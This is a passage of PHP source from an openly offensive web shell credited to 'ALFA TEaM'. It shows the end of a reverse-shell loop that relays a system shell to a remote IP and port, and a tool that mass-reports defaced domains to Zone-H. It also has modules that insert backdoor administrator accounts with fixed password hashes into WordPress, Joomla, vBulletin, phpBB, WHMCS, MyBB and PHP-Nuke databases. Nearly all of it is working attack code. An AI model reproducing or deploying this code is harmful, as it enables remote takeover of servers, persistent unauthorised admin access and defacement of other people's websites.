@stream_set_blocking($sock, 0);
echo "Successfully opened reverse shell to $ip:$port [Php]<br>";
while (1) {
if (feof($sock)) {
echo "ERROR: Shell connection terminated<br>";
break;
}
if (feof($pipes[1])) {
echo "ERROR: Shell process terminated<br>";
break;
}
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);
if (in_array($sock, $read_a)) {
if ($debug) echo "SOCK READ<br>";
$input=fread($sock, $chunk_size);
if ($debug) echo "SOCK: $input<br>";
fwrite($pipes[0], $input);
}
if (in_array($pipes[1], $read_a)) {
if ($debug) echo "STDOUT READ<br>";
$input = fread($pipes[1], $chunk_size);
if ($debug) echo "STDOUT: $input<br>";
fwrite($sock, $input);
}
if (in_array($pipes[2], $read_a)) {
if ($debug) echo "STDERR READ<br>";
$input = fread($pipes[2], $chunk_size);
if ($debug) echo "STDERR: $input<br>";
fwrite($sock, $input);
}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
echo "</pre>";
}
}
echo "</div>";
alfafooter();
}
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
$k = curl_init();
curl_setopt($k, CURLOPT_URL, $url);
curl_setopt($k,CURLOPT_POST,true);
curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
$kubra = curl_exec($k);
curl_close($k);
return $kubra;
}
function alfazoneh()
{
alfahead();
echo '<div class=header>';
if(!function_exists('curl_version'))
{
echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
}
echo '
<center><br><b><font color="#FFFF01">==</font> <font color="#00A220">ZONE-H</font> <font color="#FFFFFF">Mass</font> <font color="#FF0000">Poster</font><font color="#FFFF01"> ==</font></b><center><br>
<form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,this.go.value); return false;">
<input type="text" name="defacer" size="67" id="text" value="ALFA TEaM 2012" />
<br>
<select id="text" name="hackmode">
<option>------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(F, F, F);" value="1" >known vulnerability (i.e. unpatched system)</option>
<option style="background-color: rgb(F, F, F);" value="2" >undisclosed (new) vulnerability</option>
<option style="background-color: rgb(F, F, F);" value="3" >configuration / admin. mistake</option>
<option style="background-color: rgb(F, F, F);" value="4" >brute force attack</option>
<option style="background-color: rgb(F, F, F);" value="5" >social engineering</option>
<option style="background-color: rgb(F, F, F);" value="6" >Web Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="7" >Web Server external module intrusion</option>
<option style="background-color: rgb(F, F, F);" value="8" >Mail Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="9" >FTP Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="10" >SSH Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="11" >Telnet Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="12" >RPC Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="13" >Shares misconfiguration</option>
<option style="background-color: rgb(F, F, F);" value="14" >Other Server intrusion</option>
<option style="background-color: rgb(F, F, F);" value="15" >SQL Injection</option>
<option style="background-color: rgb(F, F, F);" value="16" >URL Poisoning</option>
<option style="background-color: rgb(F, F, F);" value="17" >File Inclusion</option>
<option style="background-color: rgb(F, F, F);" value="18" >Other Web Application bug</option>
<option style="background-color: rgb(F, F, F);" value="19" >Remote administrative panel access bruteforcing</option>
<option style="background-color: rgb(F, F, F);" value="20" >Remote administrative panel access password guessing</option>
<option style="background-color: rgb(F, F, F);" value="21" >Remote administrative panel access social engineering</option>
<option style="background-color: rgb(F, F, F);" value="22" >Attack against administrator(password stealing/sniffing)</option>
<option style="background-color: rgb(F, F, F);" value="23" >Access credentials through Man In the Middle attack</option>
<option style="background-color: rgb(F, F, F);" value="24" >Remote service password guessing</option>
<option style="background-color: rgb(F, F, F);" value="25" >Remote service password bruteforce</option>
<option style="background-color: rgb(F, F, F);" value="26" >Rerouting after attacking the Firewall</option>
<option style="background-color: rgb(F, F, F);" value="27" >Rerouting after attacking the Router</option>
<option style="background-color: rgb(F, F, F);" value="28" >DNS attack through social engineering</option>
<option style="background-color: rgb(F, F, F);" value="29" >DNS attack through cache poisoning</option>
<option style="background-color: rgb(F, F, F);" value="30" >Not available</option>
<option style="background-color: rgb(F, F, F);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select> <br>
<select id="text" name="reason">
<option >------------------------------------SELECT-------------------------------------</option>
<option style="background-color: rgb(F, F, F);" value="1" >Heh...just for fun!</option>
<option style="background-color: rgb(F, F, F);" value="2" >Revenge against that website</option>
<option style="background-color: rgb(F, F, F);" value="3" >Political reasons</option>
<option style="background-color: rgb(F, F, F);" value="4" >As a challenge</option>
<option style="background-color: rgb(F, F, F);" value="5" >I just want to be the best defacer</option>
<option style="background-color: rgb(F, F, F);" value="6" >Patriotism</option>
<option style="background-color: rgb(F, F, F);" value="7" >Not available</option>
option style="background-color: rgb(F, F, F);" value="8" >_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</option>
</select><br>
<textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
<input type="submit" value=">>" name="go"/>
</form></center>';
if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
ob_start();
$hacker = $_POST['alfa1'];
$method = $_POST['alfa2'];
$neden = $_POST['alfa3'];
$site = $_POST['alfa4'];
if (empty($hacker))
{
die ("<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}
elseif($method == "------------------------------------SELECT-------------------------------------")
{
die("<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
}
elseif($neden == "------------------------------------SELECT-------------------------------------")
{
die("<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}
elseif(empty($site))
{
die("<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$i = 0;
$sites = explode("\n", $site);
while($i < count($sites))
{
if(substr($sites[$i], 0, 4) != "http")
{
$sites[$i] = "http://".$sites[$i];
}
ZoneH("http://www.zone-h.com/notify/single", $hacker, $method, $neden, $sites[$i]);
++$i;
}
echo "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
}
echo "</div>";
alfafooter();
}
function alfateam()
{
alfahead();
echo "<div class=header>";
echo "<pre>
<center><img height=\"300\" width=\"450\" src=\"http://iran.grn.cc/alfa-iran.jpg\">
<font color=\"#FFFF01\">
<br>
<font color=#00A220><b>Shell Coded By Sole Sad & Invisible(ALFA TEaM)Iranian Hackers :)</font><b>special thanks to MadLeets</b></font><br>
<font color=#00A220>Contact : solevisible@gmail.com<br></font>
<font color=#FFFFFF>Skype : ehsan.invisible</font><br>
<font color=#FFFFFF><b>Skype : sole.sad</b></font><br><b>
<font color=#FF0000><b>Persian Gulf For Ever</b></font><br><b>

</pre></div>";
alfafooter();
}
function alfapwchanger(){
alfahead();
echo '<div class=header><script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script><center><h3><span>| Add New Admin |</span></h3>
<center><h3>
<a href=# onclick="g(\'pwchanger\',null,\'wp\')">| WordPress | </a>
<a href=# onclick="g(\'pwchanger\',null,null,\'joomla\')">| Joomla | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,\'etchat\')">| ET CHAT | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,null,\'vb\')">| vBulletin | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,null,null,\'phpbb\')">| phpBB | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,null,null,null,\'whmcs\')">| whmcs | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,null,null,null,null,\'mybb\')">| MyBB | </a>
<a href=# onclick="g(\'pwchanger\',null,null,null,null,null,null,null,null,\'nuke\')">| Php Nuke | </a>
</h3></center>';
if ($_POST['alfa1'] && $_POST['alfa1']== 'wp'){
echo '<b><center><script>alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<center><b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">WordPress</font><font color="#FFFF01"> ==</font></b><p>
<FORM onSubmit="g(\'pwchanger\',null,\'wp\',this.send.value,this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">
<table border=1>
<tr><td><font color=#FFFFFF>Host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Database :</td>
<td> <INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Table Prefix :</td>
<td><INPUT size="30" value="wp_" name="prefix" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Password :</td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin Username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password: </td>
<td><INPUT name="kh" size="30" value="solevisible" disabled /></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td><INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></b>';
if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
$localhost = $_POST['alfa3'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysql_error());
$solevisible=@mysql_query("select ID from ".$prefix."users where user_login='".$admin."'") or die(mysql_error());
$sole = mysql_num_rows($solevisible);
if ($sole == 1){
$solevis = mysql_fetch_assoc($solevisible);
$res = $solevis['ID'];
}
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','last_name','solevisible')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','nickname','solevisible')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','description','solevisible')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','rich_editing','true')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','comment_shortcuts','false')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','admin_color','fresh')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','use_ssl','0')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','show_admin_bar_front','true')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_capabilities','a:1:{s:13:\"administrator\";b:1;}')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_user_level','10')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','dismissed_wp_pointers','wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','show_welcome_panel','1')") or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','wp_dashboard_quick_press_last_post_id','3')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa2'] && $_POST['alfa2'] == 'joomla' ){
echo '<script>alfa1_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<b><center><FORM onSubmit="g(\'pwchanger\',null,this.send.value,\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">
<center><b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">Joomla</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Table Prefix :</td>
<td><INPUT size="30" value="jos_" name="prefix" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td> <INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa3'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysql_error());
$solevisible=@mysql_query("select id from ".$prefix."users where username='".$admin."'") or die(mysql_error());
$sole = mysql_num_rows($solevisible);
if ($sole == 1){
$solevis = mysql_fetch_assoc($solevisible);
$res = $solevis['id'];
}
$solevisible=@mysql_query("INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa3'] && $_POST['alfa3'] == 'etchat'){
echo '<script>alfa1_=alfa2_=alfa4_=alfa5_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<b><center> <FORM onSubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,\'etchat\',this.database.value,this.username.value,this.password.value,null,this.admin.value,null); return false;" method="POST">
<b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">Etchat</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa4'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$admin = $_POST['alfa8'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into db1_etchat_user (etchat_user_id,etchat_username,etchat_userpw,etchat_userprivilegien) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','admin')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){
echo '<script>alfa1_=alfa2_=alfa3_=alfa5_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<b><center><FORM onSubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">
<center><b><b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">vBulletin</font><font color="#FFFF01"> ==</font></b><p> <table border=1>
<tr><td><font color="#FFFFFF">host :</font></td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color="#FFFFFF">database :</font></td>
<td> <INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color="#FFFFFF">username :</font></td>
<td><INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color="#FFFFFF">password :</font></td>
<td><INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color="#FFFFFF">Prefix : </font></td>
<td><INPUT name="prefix" size="30" value="" /></td></tr>
<tr><td><font color="#FF0000">Admin username:</font></td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color="#FF0000">Admin Password : </font></td>
<td><INPUT name="hi" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color="#FF0000">Admin Email : </font></td>
<td><INPUT name="email" size="30" value="solevisible@fbi.gov"> </td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM>
</b></center>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa5'];
$password = $_POST['alfa6'];
$prefix = $_POST['alfa7'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into {$prefix}user (userid,usergroupid,username,password,salt,email) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL')") or die(mysql_error());
$solevisible=@mysql_query("select userid from {$prefix}user where username='".$admin."'") or die(mysql_error());
$sole = mysql_num_rows($solevisible);
if ($sole == 1){
$solevis = mysql_fetch_assoc($solevisible);
$res = $solevis['userid'];
}
$solevisible=@mysql_query("insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','16744444')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa5'] && $_POST['alfa5'] == 'phpbb'){
echo '<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<b> <center><FORM onSubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">
<b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">phpBB</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Table Prefix :</td>
<td><INPUT size="30" value="" name="prefix" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td> <INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM><center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa6'];
$pwd = $_POST['alfa7'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = md5($pwd);
$solevisible=@mysql_query("UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysql_error());
$solevisible=@mysql_query("UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysql_error());
$solevisible=@mysql_query("UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysql_error());
$solevisible=@mysql_query("UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysql_error());
$solevisible=@mysql_query("UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> ";
}
}
}
if ($_POST['alfa6'] && $_POST['alfa6'] == 'whmcs'){
echo '<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa7_=alfa8_=alfa9_=alfa10_=""</script>
<b><center><FORM onSubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">
<b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">Whmcs</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td> <INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into tbladmins (id,roleid,username,password,email,template,homewidgets) values(null,'1','".$admin."','d4a590caacc0be55ef286e40a945ea45','".$SQL."','blend','getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa7'] && $_POST['alfa7'] == 'mybb'){
echo '<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa8_=alfa9_=alfa10_=""</script>
<b><center><FORM onsubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,this.database.value,this.username.value,this.password.value,null,\'mybb\',this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">
<b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">Mybb</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Table Prefix :</td>
<td><INPUT size="30" value="" name="prefix" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td> <INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa8'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$solevisible=@mysql_query("insert into ".$prefix."users (uid,username,password,salt,email,usergroup) values(null,'".$admin."','e71f2c3265619038d826a1ac6e2b9b8e','ywza68lS','".$SQL."','4')") or die(mysql_error());
if($solevisible){
echo "<center><br><b><script>alert('Success... ".$admin." is created :)')</script></b></center> "; }
}
}
if ($_POST['alfa8'] && $_POST['alfa8'] == 'nuke'){
echo '<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=alfa9_=alfa10_=""</script>
<b><center><FORM onsubmit="g(\'pwchanger\',null,this.send.value,this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,\'nuke\',this.email.value,this.prefix.value); return false;" method="POST">
<b><font color="#FFFF01">==</font> <font color="#00A220">Add</font> <font color="#FFFFFF">NewAdmin</font> <font color="#FF0000">PhpNuke</font><font color="#FFFF01"> ==</font></b>
<p><table border=1>
<tr><td><font color=#FFFFFF> host :</td>
<td><INPUT size="30" value="localhost" name="localhost" type="text"></td></tr>
<tr><td><font color=#FFFFFF>database: </td>
<td><INPUT size="30" value="" name="database" type="text"></td></tr>
<tr><td><font color=#FFFFFF>Table Prefix :</td>
<td><INPUT size="30" value="" name="prefix" type="text"></td></tr>
<tr><td><font color=#FFFFFF>username : </td>
<td> <INPUT size="30" value="" name="username" type="text"></td></tr>
<tr><td><font color=#FFFFFF>password : </td>
<td> <INPUT size="30" value="" name="password" type="text"></td></tr>
<tr><td><font color=#FF0000>Admin username:</td>
<td><INPUT name="admin" size="30" value="admin"></td></tr>
<tr><td><font color=#FF0000>Admin Password :<font color="#FFFFFF"></td>
<td><INPUT name="toftof" size="30" value="solevisible" disabled/></td></tr>
<tr><td><font color=#FF0000>Admin Email:</td>
<td> <INPUT name="email" size="30" value="solevisible@fbi.gov"></td></tr>
</table>
<INPUT value=">>" name="send" type="submit">
</FORM></center></b>';
if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
$localhost = $_POST['alfa2'];
$database = $_POST['alfa3'];
$username = $_POST['alfa4'];
$password = $_POST['alfa5'];
$admin = $_POST['alfa7'];
$SQL = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = md5($pwd);
